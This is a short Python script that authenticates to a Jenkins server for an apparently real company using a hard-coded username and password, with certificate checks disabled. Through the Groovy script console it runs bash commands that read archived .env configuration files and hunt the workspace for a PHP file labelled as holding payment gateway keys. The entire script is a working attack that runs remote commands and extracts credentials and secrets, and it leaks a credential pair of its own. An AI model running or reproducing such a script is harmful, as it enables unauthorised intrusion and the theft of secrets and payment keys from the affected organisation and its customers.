import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def run_groovy(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    r = opener.open(req, timeout=15)
    crumb = json.loads(r.read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
        headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']})
    r2 = opener.open(req2, timeout=90)
    return r2.read().decode()

# T1 Admin API .env (latest build)
print("=" * 60)
print("T1-ADMIN-API .env (claroenvios)")
print("=" * 60)
q1 = 'def r = ["bash","-c","cat /var/jenkins_home/jobs/t1e_legacy_back/jobs/t1e_legacy_pipe_build_t1-admin-api-config/builds/195/archive/claroenvios/desarrollo/config/.env"].execute().text\nprintln r'
print(run_groovy(q1))

# Plataforma Claro .env
print("=" * 60)
print("PLATAFORMA CLARO (pc-admin-api) .env")
print("=" * 60)
q2 = 'def r = ["bash","-c","cat /var/jenkins_home/jobs/pc_legacy_back/jobs/pc_legacy_pipe_build_pc-admin-api-config/builds/51/archive/ApiPlataformaClaro/desarrollo/config/.env"].execute().text\nprintln r'
print(run_groovy(q2))

# OpenAPI factory from caja-pagos
print("=" * 60)
print("CAJA-PAGOS OpenAPIServiceFactory.php (contains payment gateway keys)")
print("=" * 60)
q3 = 'def r = ["bash","-c","find /var/jenkins_home/workspace -path *OpenAPIServiceFactory* -type f 2>/dev/null | xargs cat 2>/dev/null | head -80"].execute().text\nprintln r'
print(run_groovy(q3))
